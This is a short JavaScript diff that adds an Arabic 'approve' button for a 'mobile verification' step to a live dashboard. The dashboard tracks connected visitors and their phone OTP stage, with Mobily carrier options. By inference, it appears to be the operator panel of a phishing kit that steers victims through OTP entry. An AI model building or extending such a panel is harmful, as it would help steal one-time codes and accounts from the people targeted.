@@ -1570,6 +1570,9 @@
               if (visitor.network === 'موبايلي') {
                 html += '<button id="' + phoneOtpMobilyBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال موبايلي</button>';
               }
+            } else if (dc.page === 'توثيق الجوال') {
+              // أزرار صفحة توثيق الجوال - موافقة ترسل للصفحة النهائية
+              html += '<button onclick="codeActionApprove(this, \'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
             } else {
               html += '<button onclick="codeActionApprove(this, \'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
             }
